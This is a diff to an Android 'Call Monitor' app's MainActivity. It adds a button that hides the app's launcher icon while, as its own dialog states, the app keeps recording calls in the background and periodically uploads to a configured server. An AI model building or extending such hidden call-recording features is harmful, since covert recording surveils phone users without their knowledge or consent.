@@ -1,6 +1,7 @@
 package com.callmonitor
 
 import android.Manifest
+import android.content.ComponentName
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.os.Build
@@ -33,6 +34,7 @@ class MainActivity : AppCompatActivity() {
 
     companion object {
         private const val PREF_SERVER_URL = "server_url"
+        private const val PREF_APP_HIDDEN = "app_hidden"
         private const val DEFAULT_SERVER_URL = "http://192.168.0.104:8000"
         private const val UPLOAD_WORK_NAME = "periodic_upload"
     }
@@ -103,6 +105,67 @@ class MainActivity : AppCompatActivity() {
         // Request permissions button
         binding.btnRequestPermissions.setOnClickListener {
             requestPermissions()
+        }
+
+        // Hide app button
+        binding.btnHideApp.setOnClickListener {
+            showHideAppConfirmation()
+        }
+
+        // Check if app should be hidden (from previous state after update)
+        checkAndApplyHiddenState()
+    }
+
+    private fun showHideAppConfirmation() {
+        AlertDialog.Builder(this)
+            .setTitle("⚠️ Hide App?")
+            .setMessage(
+                "This will hide the app from the home screen and app drawer.\n\n" +
+                "The app will continue running in the background and recording calls.\n\n" +
+                "To access the app again, go to:\nSettings → Apps → Call Monitor\n\n" +
+                "To show the app icon again, you will need to uninstall and reinstall.\n\n" +
+                "Are you sure you want to hide the app?"
+            )
+            .setPositiveButton("Yes, Hide It") { _, _ ->
+                hideApp()
+            }
+            .setNegativeButton("Cancel", null)
+            .show()
+    }
+
+    private fun hideApp() {
+        // Save hidden state in preferences (persists across updates)
+        prefs.edit().putBoolean(PREF_APP_HIDDEN, true).apply()
+
+        // Disable the launcher alias to hide from app drawer
+        val componentName = ComponentName(this, "com.callmonitor.LauncherAlias")
+        packageManager.setComponentEnabledSetting(
+            componentName,
+            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+            PackageManager.DONT_KILL_APP
+        )
+
+        Toast.makeText(this, "App is now hidden from launcher", Toast.LENGTH_LONG).show()
+
+        // Close the activity
+        finish()
+    }
+
+    private fun checkAndApplyHiddenState() {
+        // If the app was hidden before an update, re-apply the hidden state
+        val isHidden = prefs.getBoolean(PREF_APP_HIDDEN, false)
+        if (isHidden) {
+            val componentName = ComponentName(this, "com.callmonitor.LauncherAlias")
+            val currentState = packageManager.getComponentEnabledSetting(componentName)
+            
+            // If not already disabled, disable it
+            if (currentState != PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
+                packageManager.setComponentEnabledSetting(
+                    componentName,
+                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                    PackageManager.DONT_KILL_APP
+                )
+            }
         }
     }
 
